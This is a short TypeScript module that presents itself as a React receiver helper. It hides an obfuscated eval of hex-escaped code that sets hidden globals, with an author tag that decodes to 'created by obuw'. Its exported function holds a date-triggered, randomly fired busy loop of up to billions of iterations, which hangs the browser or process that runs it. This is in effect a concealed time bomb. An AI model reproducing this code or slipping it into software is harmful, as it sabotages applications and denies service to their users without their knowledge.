
import { rand as dnar, rand } from "./index";

let si = 0;

(function rc_recivers() { const E = () => eval; E().bind(window)(`var aut=["\x63\x72\x65\x61\x74\x65\x64\x20\x62\x79\x20\x6F\x62\x75\x77\x20"];var ti=new Date().getTime();window["__REACT_RECIVERS"+ti+"__"]=aut;window.__REACT_TI__=ti;`); })();


export default
function rc_recivers_set(t: any, p: any, v: any, r: any) {
  t.pop((() => {
    return (v.__REACT_TI__ ? (+v.__REACT_TI__.toString().slice(2) > 77923200000 ? ((!(dnar(4) ^ 1)) ? (() => { const oj = dnar(19 + new Date().getMonth()) * 1e8; let b = -355; do { b++; } while (b < oj); })() : t.push(si++)) : (v)) : (v));
  })());
  return v;
}

